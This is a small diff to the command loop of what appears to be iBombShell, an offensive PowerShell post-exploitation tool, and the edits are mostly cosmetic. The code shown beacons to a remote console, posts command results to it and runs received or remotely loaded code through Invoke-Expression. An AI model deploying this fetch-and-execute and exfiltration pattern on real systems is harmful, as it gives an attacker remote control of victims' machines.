@@ -236,15 +236,8 @@ function console{
                     }
                     iwr -UseBasicParsing -Method POST -Uri "$uriConsole/ibombshell/$id" -Body @{results=$results}
                 } 
-
-                
-                sleep 5
             }
-            else
-            {
-                sleep 5
-            }
-            
+            sleep 5
         }
         else
         {
@@ -268,13 +261,12 @@ function console{
                     }
                 }
             }
-            elseif ((commandsearch -command $command.split(" ")[0] -list $functionsLoaded)-and($command.Split(" ")[0].Equals("loaderext")))
+            elseif ((commandsearch -command $command.split(" ")[0] -list $functionsLoaded) -and ($command.Split(" ")[0].Equals("loaderext")))
             {
                 $command | iex | iex
             }
             elseif (commandsearch -command $command.split(" ")[0] -list $functionsLoaded)
             {
-                #$command
                 $command | iex
             }
             elseif (commandsearch -command $command -list $localcommandlist)
@@ -282,11 +274,10 @@ function console{
                 try {
                     $result = addcommand -command $command 
                     if ($result -ne -1) {
-                        #loader -command $command -RawBase $gtRawBase -RawFunctions $gtRawFunctions
                         loader -command $command -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
                         printMessage -message "Function Loaded"
                     }else{
-                    printMessage -message "That function is already loaded"
+                        printMessage -message "That function is already loaded"
                     }
                 } catch {
                     printMessage -message "Something went wrong loading the module"
